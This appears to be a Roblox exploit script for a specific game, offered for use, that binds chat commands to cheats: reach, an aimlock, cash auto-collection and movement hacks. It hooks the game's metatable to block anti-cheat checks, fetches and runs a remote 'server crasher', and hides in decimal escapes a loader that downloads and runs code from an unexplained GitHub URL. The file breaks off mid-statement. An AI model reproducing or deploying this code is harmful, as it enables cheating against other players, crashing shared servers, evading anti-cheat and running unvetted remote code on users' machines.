wait(1)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".unban" then
        wait(1)
local player = game.Players.LocalPlayer
                local function DeleteChar()
                    for i,v in pairs(player.Character:GetChildren()) do
                        if v:IsA('MeshPart') or v:IsA('Part') or v:IsA('Accessory') then
                            v:Destroy()
                        end
                    end
                    player.Character.Name = 'deleted'
                end

                DeleteChar()
                local newCharacter =  game.Workspace:WaitForChild(player.Name)
                local spoofFolder = Instance.new('Folder');
                spoofFolder.Name = 'FULLY_LOADED_CHAR';
                spoofFolder.Parent = newCharacter;
                newCharacter:WaitForChild('RagdollConstraints'):Destroy();
                local spoofValue = Instance.new('BoolValue', newCharacter);
                spoofValue.Name = 'RagdollConstraints';            
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".godblock" then
game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'):FindFirstChild('Defense'):FindFirstChild('CurrentTimeBlock'):Destroy();
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".godbullet" then
     local player = game.Players.LocalPlayer
                player.Character.BodyEffects.Armor:Destroy()
                local Armor = Instance.new("IntValue", player.Character.BodyEffects)
                Armor.Name = 'Armor'
                Armor.Value = 100
            end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == "/e reach" then
                    reaching = true
                local player = game.Players.LocalPlayer
                local function reach(v)
                    if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                            else
                                firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                            end
                        end
                    end
                end
                
                while reaching == true do
                    wait()
                    for i,v in pairs(game.Players:GetChildren()) do
                        local success, err = pcall(function()
                            reach(v)
                        end)
                    end
                end
            end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".ungrab" then
                local player = game.Players.LocalPlayer
                local GC = game:GetService("Workspace").Players:WaitForChild(player.Name):FindFirstChild("GRABBING_CONSTRAINT")
                if GC then
                    GC:Destroy()
                    wait(0.04)
                    player.character.Humanoid.Sit = true
                end
            end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".loopungrab" then
                while true do
                    wait(0.1)
                local player = game.Players.LocalPlayer
                local GC = game:GetService("Workspace").Players:WaitForChild(player.Name):FindFirstChild("GRABBING_CONSTRAINT")
                if GC then
                    GC:Destroy()
                    wait(0.04)
                    player.character.Humanoid.Sit = true
                end
                end
        end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".hideuser" then
                        if game.Players.LocalPlayer.Character:FindFirstChild('In-gameMask') then
                    if game.Players.LocalPlayer.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle') then
                        game.Players.LocalPlayer.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle'):Destroy()
                    end
                end
            end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".allstats" then
                        local formatNumber = (function (n)
                    n = tostring(n)
                    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                end)
                for _,v in pairs(game:GetService('Players'):GetPlayers()) do
                    if v:FindFirstChild('DataFolder') then
                        if v.DataFolder:FindFirstChild('Currency') then
                            if v.DataFolder.Currency.Value ~= nil then
                                print(v.Name)
                                print('Cash : ' .. formatNumber(v.DataFolder.Currency.Value))
                                print('Bounty : ' .. formatNumber(v.leaderstats.Wanted.Value))
                                print('--------------')
                            else
                                print(v.Name .. ' is still loading')
                            end
                        else
                            print(v.Name .. ' is still loading')
                        end
                    else
                        print(v.Name .. ' is still loading')
                    end
                end
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".antislow" then
        nolimit = true
                local player = game.Players.LocalPlayer
                local loopFunction = function()
                    local Movement = game:GetService("Workspace").Players:WaitForChild(player.Name).BodyEffects.Movement
                    local SlowDown = Movement:FindFirstChild('NoWalkSpeed') or Movement:FindFirstChild('ReduceWalk') or Movement:FindFirstChild('NoJumping')
                    if SlowDown then
                        SlowDown:Destroy()
                    end
                    local Reloading = player.Character:FindFirstChild('BodyEffects'):FindFirstChild('Reload')
                    if Reloading then
                        if Reloading.Value == true then
                            Reloading.Value = false
                        end
                    end
                end;
                local Loop
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                end;
                Start()
                repeat wait() until nolimit == false
                Pause()
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".unantislow" then
                        nolimit = false
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".stamina" then
        local player = game.Players.LocalPlayer
                local spacedown = false
                staminup = true
                game:GetService('UserInputService').InputBegan:Connect(function(key,b)
                    if key.KeyCode == Enum.KeyCode.Space and not b then
                        if staminup == true then
                            spacedown = true
                            while spacedown == true do
                                wait()
                                player.Character:FindFirstChildWhichIsA('Humanoid').JumpPower = 50
                                player.Character:FindFirstChildWhichIsA('Humanoid').Jump = true
                                player.Character:FindFirstChildWhichIsA('Humanoid').JumpPower = 50
                            end
                        end
                    end
                end)
                game:GetService('UserInputService').InputEnded:Connect(function(key,b)
                    if key.KeyCode == Enum.KeyCode.Space and not b then
                        if staminup == true then
                            spacedown = false
                        end
                    end
                end)
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".unstamina" then
                        staminup = false
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".grabcash" then
                        cashauraing = true
                local player = game.Players.LocalPlayer
                local Loop
                local Pause = function()
                    Loop:Disconnect()
                end;
                local loopFunction = function()
                    local UpperTorso = game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
                    if UpperTorso then
                        for i,v in pairs(game:GetService('Workspace'):WaitForChild('Ignored'):WaitForChild('Drop'):GetChildren()) do
                            if v:IsA('Part') then
                                local checkmag = (v.Position - UpperTorso.Position).Magnitude
                                if checkmag <= 10 then
                                    fireclickdetector(v:FindFirstChild('ClickDetector'))
                                end
                            end
                        end
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                Start()
                repeat wait() until cashauraing == false
                Pause()    
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".ungrabcash" then
                        cashauraing = false
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".foolscrash" then
                            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                        end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == "/e aimlock" then
        		-- Toggle
getgenv().Target = true
-- Configuration
    getgenv().Key = Enum.KeyCode.E
getgenv().Prediction = 0.1
getgenv().ChatMode = true
getgenv().NotifMode = true
    getgenv().PartMode = true
    getgenv().AirshotFunccc = true
    getgenv().Partz = "UpperTorso"
getgenv().AutoPrediction = true
--
    _G.Types = {
        Ball = Enum.PartType.Ball,
        Block = Enum.PartType.Block, 
        Cylinder = Enum.PartType.Cylinder
    }
    
    --variables                 
    	local Tracer = Instance.new("Part", game.Workspace)
    Tracer.Name = "gay"	
    Tracer.Anchored = true		
    Tracer.CanCollide = false
    Tracer.Transparency = 0.8
    Tracer.Parent = game.Workspace	
    Tracer.Shape = _G.Types.Block
    Tracer.Size = Vector3.new(14,14,14)
    Tracer.Color = Color3.fromRGB(128,128,128)
    
    --
    local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
local Runserv = game:GetService("RunService")

circle = Drawing.new("Circle")
circle.Color = Color3.fromRGB(255,255,255)
circle.Thickness = 0
circle.NumSides = 732
circle.Radius = 120
circle.Thickness = 0
circle.Transparency = 0.7
circle.Visible = false
circle.Filled = false

Runserv.RenderStepped:Connect(function()
    circle.Position = Vector2.new(mouse.X,mouse.Y+35)
end)
    
    	local guimain = Instance.new("Folder", game.CoreGui)
    	local CC = game:GetService"Workspace".CurrentCamera
    local LocalMouse = game.Players.LocalPlayer:GetMouse()
    	local Locking = false
    
    	
    --
    if getgenv().valiansh == true then
        
        return
    end
    
    getgenv().valiansh = true
    
        local UserInputService = game:GetService("UserInputService")

    UserInputService.InputBegan:Connect(function(keygo,ok)
           if (not ok) then
           if (keygo.KeyCode == getgenv().Key) then
               if getgenv().Target == true then
               Locking = not Locking
               
               if Locking then
               Plr =  getClosestPlayerToCursor()
                if getgenv().ChatMode then
        	end	
               if getgenv().NotifMode then
    			game.StarterGui:SetCore("SendNotification", {
    
    })
    end
    elseif not Locking then
         if getgenv().ChatMode then
        	end	 
               
               end
                  
 
 end     end   
end
end)
	function getClosestPlayerToCursor()
		local closestPlayer
		local shortestDistance = circle.Radius

		for i, v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
				if magnitude < shortestDistance then
					closestPlayer = v
					shortestDistance = magnitude
				end
			end
		end
		return closestPlayer
	end
--
if getgenv().PartMode then
	game:GetService"RunService".Stepped:connect(function()
		if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
			Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
		else
			Tracer.CFrame = CFrame.new(0, 9999, 0)

		end
	end)
end

    
    
    --
	local rawmetatable = getrawmetatable(game)
	local old = rawmetatable.__namecall
	setreadonly(rawmetatable, false)
	rawmetatable.__namecall = newcclosure(function(...)
		local args = {...}
		if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
			args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
			return old(unpack(args))
		end
		return old(...)
	end)


if getgenv().AirshotFunccc == true then

            if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Partz = "RightFoot"
            else
                Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
                    if new == Enum.HumanoidStateType.Freefall then
                    getgenv().Partz = "RightFoot"
                    else
                        getgenv().Partz = "LowerTorso"
                    end
                end)
            end
end
---
	while wait() do
	if getgenv().AutoPrediction == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])
        if ping < 130 then
            getgenv().Prediction = 0.151
        elseif ping < 120 then
            getgenv().Prediction = 0.149
        elseif ping < 110 then
            getgenv().Prediction = 0.146
        elseif ping < 105 then
            getgenv().Prediction = 0.138
        elseif ping < 90 then
            getgenv().Prediction = 0.136
        elseif ping < 80 then
            getgenv().Prediction = 0.134
        elseif ping < 70 then
            getgenv().Prediction = 0.131
        elseif ping < 60 then
            getgenv().Prediction = 0.1229
        elseif ping < 50 then
            getgenv().Prediction = 0.1225
        elseif ping < 40 then
            getgenv().Prediction = 0.1256
        end
	end
    end
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == "/e ps" then
      getgenv().Transform = "Transform!"
getgenv().Titan = "Rage!"
getgenv().DashLoad = "LOADDASH"
getgenv().Stand = "/e stand"
getgenv().DragonMode = "/e dragonmode"
getgenv().HideMask = "/e hidemask"
getgenv().Safetp = "/base"
getgenv().Revive = "/revive"

-- Text Commands
getgenv().TimeStop = "ZA WARUDO!"
getgenv().TimeStop1 = "STAR PLATINUM ZA WARUDO!"
getgenv().TimeErase = "Time erase!"
getgenv().DeadShot = "_DEADSHOT"
getgenv().YourGone = "You're Gone."
getgenv().Die = "Die!"
getgenv().HowManyMins = "How many minutes will you last?"
getgenv().GoodGrief = "Good Grief."
getgenv().GoodGrief2 = "Yare Yare Daze."
getgenv().DiavoloDa = "Diavolo Da!"
getgenv().Wry = "WRYY!"
getgenv().YouFool = "You fool."
getgenv().HAHNW = "Heart Attack Has No Weakness."
getgenv().KingCrimson = "King Crimson!"
getgenv().ZaWarudo = "Za Warudo."
getgenv().Yes = "Yes YES!"
getgenv().Hey = "Hey HEY HEY!"
getgenv().Pose = "Pose!"
getgenv().D4C = "D4C!"



--toggle
local standmode = false
local dragonmode = false
local bulletdef = false
local dashtoggle = false
local isrevive = false
local isstped = false

--end


local OriginalKeyUpValue = 0
function StopAudio()
	if game:GetService("Players").LocalPlayer.Character.LowerTorso:FindFirstChild("BOOMBOXSOUND") then
		game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
	end
end
function stop(ID, Key)
	local cor = coroutine.wrap(function()
		wait(game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
		if game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
			StopAudio()
		end
	end)
	cor()
end
function play(ID, STOP, LMAO)
	if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
		local Tool = nil
		if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") and LMAO == true then
			Tool = game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Parent = game:GetService("Players").LocalPlayer.Backpack
		end
		game:GetService("Players").LocalPlayer.Backpack["[Boombox]"].Parent =
			game:GetService("Players").LocalPlayer.Character
		game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
		game:GetService("Players").LocalPlayer.Character["[Boombox]"].RequiresHandle = false
		if game:GetService("Players").LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
			game:GetService("Players").LocalPlayer.Character["[Boombox]"].Handle:Destroy()
		end
		game:GetService("Players").LocalPlayer.Character["[Boombox]"].Parent =
			game:GetService("Players").LocalPlayer.Backpack
		game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
		if Tool ~= true then
			if Tool then
				Tool.Parent = game:GetService("Players").LocalPlayer.Character
			end
		end
		if STOP == true then
			game:GetService("Players").LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
			local cor = coroutine.wrap(function()
				repeat wait() until game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
				OriginalKeyUpValue = OriginalKeyUpValue+1
				stop(ID, OriginalKeyUpValue)
			end)
			cor()
		end
	end
end

local oldc = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game:GetService('Players').LocalPlayer.Chatted:Connect(function(msg)
	if msg == getgenv().Stand then
		standmode = true
		if standmode then
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "rbxassetid://7318630720"
			Animate.idle.Animation2.AnimationId = "rbxassetid://7318630720"
			Animate.run.RunAnim.AnimationId = "rbxassetid://657564596"
			Animate.walk.WalkAnim.AnimationId = "rbxassetid://657552124"
			Animate.climb.ClimbAnim.AnimationId = "rbxassetid://658360781"
			Animate.fall.FallAnim.AnimationId = "rbxassetid://657600338"
			Animate.swim.Swim.AnimationId = "rbxassetid://657560551"
			Animate.swimidle.SwimIdle.AnimationId = "rbxassetid://657557095"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		else 
			standmode = false
		end
	elseif msg == getgenv().DragonMode then
		if dragonmode then
			dragonmode = false
		end
		dragonmode = true
	elseif msg == getgenv().Transform then   
		if bulletdef == false then
			bulletdef = true
			local bulletids = {
				"5185157119";
				"5185157257";
			}
			local Humanoid = game.Players.LocalPlayer.Character.Humanoid
			local OldHealth = Humanoid.Health
			Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
				if bulletdef == true then
					if Humanoid.Health < OldHealth then
						play(bulletids[math.random(1,#bulletids)], true, true)
					end
					OldHealth = Humanoid.Health
				end
			end)
		elseif bulletdef == true then
			bulletdef = false
		end
	elseif msg == getgenv().DashLoad then
		if dashtoggle == false then
			dashtoggle = true
			local Char = game.Players.LocalPlayer.Character local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
			while dashtoggle do wait()
				for i,v in next, Hum:GetPlayingAnimationTracks() do
					if v.Animation.AnimationId == "rbxassetid://2788289281" then
						v:Stop()
						for i,v in next, Hum:GetPlayingAnimationTracks() do
							if v.Animation.AnimationId == "rbxassetid://2788292075" then
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -30)
								wait(0.1)
								game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = true;
								wait(1.5)
								game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = false
							end
						end
					end
				end
			end
		else
			dashtoggle = false
		end
	elseif msg == getgenv().HideMask then  
		if game.Players.LocalPlayer.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle') then
			game.Players.LocalPlayer.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle'):Destroy()
		end
	elseif msg == getgenv().Safetp then
		if isstped == false then
			isstped = true
			oldc = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			wait(0.75)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207, 38, 200016)
		elseif isstped then
			isstped = false
			wait(0.75)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldc
		end
	elseif msg == getgenv().Revive then
		if isrevive == false then
			isrevive = true
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm back!", "All")
			while isrevive do
				wait()
				for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
					if v.Name == "GRABBING_CONSTRAINT" then
						v:Destroy()
						game.Players.LocalPlayer.Character.Humanoid.Sit = true
						wait(0.2)
						game.Players.LocalPlayer.Character.Humanoid.Jump = true
					end
				end
			end
		else 
			isrevive = false
		end
	end
end)
local oldc = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game:GetService('Players').LocalPlayer.Chatted:Connect(function(msg)
    if msg == getgenv().TimeStop then
        stoptime()
    elseif msg == TimeStop1 then
        stoptime()
    elseif msg == getgenv().TimeErase then
        if XD == false and not Poter.IsPlaying then
            XDDDD(XD)
        elseif XD == true and not Poter.IsPlaying then
            XDDDD(XD)
        end
    elseif msg == getgenv().DeadShot then

    elseif msg == getgenv().YourGone then
        play(1436242274, true, true)
    elseif msg == getgenv().Die then    
        play(247615928, true, true);
    elseif msg == getgenv().HowManyMins then    
        play(159882644, true, true);   
    elseif msg == getgenv().GoodGrief then    
        play(6603016929, true, true);
    elseif msg == getgenv().GoodGrief2 then
        play(6603016929, true, true);   
    elseif msg == getgenv().DiavoloDa then   
        play(6553075707, true, true);
    elseif msg == getgenv().Wry then    
        play(6661495281, true, true);
    elseif msg == getgenv().YouFool then    
        play(2554775814, true, true);
    elseif msg == getgenv().HAHNW then    
        play(3077251681, true, true);
    elseif msg == getgenv().KingCrimson then 
        play(3373956700, true, true);
    elseif msg == getgenv().ZaWarudo then    
        play(3084535090, true, true);
    elseif msg == getgenv().Yes then   
        play(3378133256, true, true);
    elseif msg == getgenv().Hey then   
        play(2652135070, true, true);
    elseif msg == getgenv().D4C then   
        play(2652135070, true, true);
    elseif msg == getgenv().Pose then   
        play(6552805469, true, true)
end
end)
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".dash" then
    local OriginalKeyUpValue = 0
function StopAudio()
    if game:GetService("Players").LocalPlayer.Character.LowerTorso:FindFirstChild("BOOMBOXSOUND") then
        game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
    end
end
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
function play(ID, STOP, LMAO)
    if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") and LMAO == true then
            Tool = game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
            game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Parent = game:GetService("Players").LocalPlayer.Backpack
        end
        game:GetService("Players").LocalPlayer.Backpack["[Boombox]"].Parent =
            game:GetService("Players").LocalPlayer.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        game:GetService("Players").LocalPlayer.Character["[Boombox]"].RequiresHandle = false
        if game:GetService("Players").LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
            game:GetService("Players").LocalPlayer.Character["[Boombox]"].Handle:Destroy()
        end
        game:GetService("Players").LocalPlayer.Character["[Boombox]"].Parent =
            game:GetService("Players").LocalPlayer.Backpack
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = game:GetService("Players").LocalPlayer.Character
            end
        end
        if STOP == true then
            game:GetService("Players").LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
            cor()
        end
    end
end
      local Char = game.Players.LocalPlayer.Character local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
        while true do wait()
            for i,v in next, Hum:GetPlayingAnimationTracks() do
                if v.Animation.AnimationId == "rbxassetid://2788289281" then
                    v:Stop()
                    for i,v in next, Hum:GetPlayingAnimationTracks() do
                        if v.Animation.AnimationId == "rbxassetid://2788292075" then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -20)
                            wait(0.1)
                            play(558640653, true, true)
                            game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = true;
                            wait(1.5)
                            game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = false
                        end
                    end
                end
            end
        end   
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".deflect" then
    local LocalPlayer = game:GetService("Players").LocalPlayer
local Cookies = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
local OriginalKeyUpValue = 0
local Anim = Instance.new("Animation" )
Anim.AnimationId = "rbxassetid://2788290270"
local CoreUI = Instance.new("ScreenGui")
CoreUI.Parent = game.CoreGui
local SaveLocation = nil
local RigWalk = nil
local RigIdle = nil
local InTimeErase = false

local Pointing = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
Pointing.AnimationId = "rbxassetid://507770453"

local Poter = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
Poter.Looped = true
Poter.Priority = Enum.AnimationPriority.Action

local WalkAnimation = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
WalkAnimation.AnimationId = "rbxassetid://2510198475"

local Idle = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
Idle.AnimationId = "rbxassetid://507766388"

local OldChar = LocalPlayer.Character

local Mouse = LocalPlayer:GetMouse()

assert(getrawmetatable)
gmt = getrawmetatable(game)
setreadonly(gmt, false)
old = gmt.__namecall
gmt.__namecall =
    newcclosure(
        function(self, ...)
        local args = {...}
        if tostring(args[1]) == "TeleportDetect" then
            return
        elseif tostring(args[1]) == "CHECKER_1" then
            return
        elseif tostring(args[1]) == "CHECKER" then
            return
        end

        return old(self, ...)
    end
    )

        local CD = false
        local uis = game:GetService("UserInputService")

        function StopAudio()
           OldChar.LowerTorso.BOOMBOXSOUND:Stop()
        end

        function stop(ID, Key)
            local cor = coroutine.wrap(function()
                wait(OldChar.LowerTorso.BOOMBOXSOUND.TimeLength-0.2)
                if OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                    StopAudio()
                end
            end)
            cor()
        end


        function play(ID, STOP, LMAO)
            if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
                local Tool = nil
                if OldChar:FindFirstChildOfClass("Tool") and LMAO == true then
                    Tool = OldChar:FindFirstChildOfClass("Tool")
                    OldChar:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
                end
                LocalPlayer.Backpack["[Boombox]"].Parent =
                    OldChar
                game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
              OldChar["[Boombox]"].RequiresHandle = false
                if OldChar["[Boombox]"]:FindFirstChild("Handle") then
                    OldChar["[Boombox]"].Handle:Destroy()
                end
               OldChar["[Boombox]"].Parent =
                    LocalPlayer.Backpack
                LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
                if Tool ~= true then
                    if Tool then
                        Tool.Parent = OldChar
                    end
                end
                if STOP == true then
                    OldChar.LowerTorso:WaitForChild("BOOMBOXSOUND")
                    local cor = coroutine.wrap(function()
                        repeat wait() until OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OldChar.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                        OriginalKeyUpValue = OriginalKeyUpValue+1
                        stop(ID, OriginalKeyUpValue)
                    end)
                    cor()
                end
            end
        end
        local Humanoid = game.Players.LocalPlayer.Character.Humanoid
        local OldHealth = Humanoid.Health
        
        Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
        if Humanoid.Health < OldHealth then
            play(186130717,true,true)
        end
        
        OldHealth = Humanoid.Health
        end)
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".fat" then
    game.Players.LocalPlayer.Character.Humanoid.BodyDepthScale:Destroy()
        game.Players.LocalPlayer.Character.Humanoid.BodyWidthScale:Destroy()
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".godv3" then
    loadstring('\32\32\32\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\70\65\83\68\65\83\68\65\68\65\83\68\68\83\68\65\68\83\65\83\68\47\115\115\100\97\115\100\115\97\115\97\100\97\115\100\47\109\97\105\110\47\97\115\100\115\97\100\97\115\100\97\115\100\115\100\97\100\39\41\41\40\41\32\32\32\32')()
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".anime" then
        

if not game["Loaded"] or not game:GetService("Players")["LocalPlayer"] then
    game["Loaded"]:Wait()
    game:WaitForChild(game:GetService("Players"))
    game:GetService("Players"):WaitForChild(game:GetService("Players").LocalPlayer.Name)
    repeat
        game:GetService("RunService").RenderStepped:Wait()
    until game:GetService("Players").LocalPlayer.Character
end
if game.PlaceId == 2788229376 then
